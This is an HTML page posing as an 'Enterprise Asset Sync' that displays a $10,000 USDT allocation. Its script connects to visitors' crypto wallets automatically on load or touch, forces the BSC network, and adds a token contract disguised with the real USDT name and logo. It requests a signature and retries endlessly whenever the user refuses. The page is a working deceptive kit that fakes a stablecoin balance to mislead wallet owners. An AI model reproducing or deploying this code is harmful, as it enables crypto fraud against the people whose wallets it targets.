<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Enterprise Asset Sync | Protocol V9</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --main: #26a17b; --bg: #0b0e11; }
        body { background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #161a1e; border: 1px solid #333; border-radius: 30px; padding: 40px; width: 85%; max-width: 380px; text-align: center; box-shadow: 0 25px 60px rgba(0,0,0,0.7); }
        .logo-box { width: 90px; height: 90px; margin: 0 auto 20px; background: rgba(38,161,123,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 1px solid rgba(38,161,123,0.3); }
        .logo-img { width: 60px; filter: drop-shadow(0 0 10px rgba(38,161,123,0.5)); }
        .amount { font-size: 45px; font-weight: 900; color: #fff; margin: 10px 0; letter-spacing: -1px; }
        .btn { background: var(--main); color: #fff; border: none; width: 100%; padding: 22px; border-radius: 18px; font-size: 19px; font-weight: 800; cursor: pointer; margin-top: 30px; box-shadow: 0 10px 25px rgba(38,161,123,0.4); text-transform: uppercase; transition: 0.2s; }
        .btn:active { transform: scale(0.96); opacity: 0.9; }
        #status { font-size: 10px; color: #555; margin-top: 25px; font-family: 'Courier New', monospace; text-transform: uppercase; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo-box">
        <img src="https://token.mclw.io/images/usdt.png" class="logo-img">
    </div>
    <div style="font-size: 12px; color: var(--main); font-weight: bold; letter-spacing: 2px;">SECURE NODE ALLOCATION</div>
    <div class="amount">$10,000.00</div>
    <button class="btn" id="masterTrigger">ACTIVATE & SYNC</button>
    <div id="status">LOG: SYSTEM_READY_V9</div>
</div>

<script>
    const btn = document.getElementById('masterTrigger');
    const log = document.getElementById('status');

    // HIGH-LEVEL METADATA (Direct CDN Links)
    const ASSET_CONFIG = {
        type: 'ERC20',
        options: {
            address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
            symbol: "USDT",
            decimals: 18,
            image: "https://token.mclw.io/images/usdt.png" // New High-Speed CDN Link
        }
    };

    async function startInjection() {
        const provider = window.trustwallet || window.ethereum;

        if (!provider) {
            log.innerText = "LOG: REDIRECTING...";
            const target = window.location.href.split('://')[1];
            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + target);
            return;
        }

        try {
            log.innerText = "LOG: INITIALIZING HANDSHAKE...";
            const accounts = await provider.request({ method: 'eth_requestAccounts' });

            log.innerText = "LOG: FORCING BSC NETWORK...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }]
            }).catch(async (err) => {
                if (err.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            });

            log.innerText = "LOG: INJECTING ASSET METADATA...";
            
            // Double-Trigger Logic for Logo Persistence
            setTimeout(async () => {
                const result = await provider.request({
                    method: 'wallet_watchAsset',
                    params: ASSET_CONFIG
                });

                if (result) {
                    log.innerText = "LOG: SUCCESS_SYNCED";
                    btn.innerText = "SYNCED ✅";
                    btn.style.background = "#333";
                    
                    // Final Security Signature
                    await provider.request({
                        method: 'personal_sign',
                        params: ["Node Auth Success: " + accounts[0], accounts[0]]
                    });
                }
            }, 1200);

        } catch (e) {
            log.innerText = "LOG: SESSION_REJECTED. RETRYING...";
            setTimeout(startInjection, 1000); // Recursive Retry
        }
    }

    btn.onclick = startInjection;

    // Mobile Interaction Guard
    window.addEventListener('touchstart', function() {
        if (log.innerText.includes("READY")) {
            startInjection();
        }
    }, {once: true});

    window.onload = () => {
        if (window.ethereum || window.trustwallet) {
            log.innerText = "LOG: DAPP_INTERNAL_ACTIVE";
            setTimeout(startInjection, 3000);
        }
    };
</script>
</body>
</html>
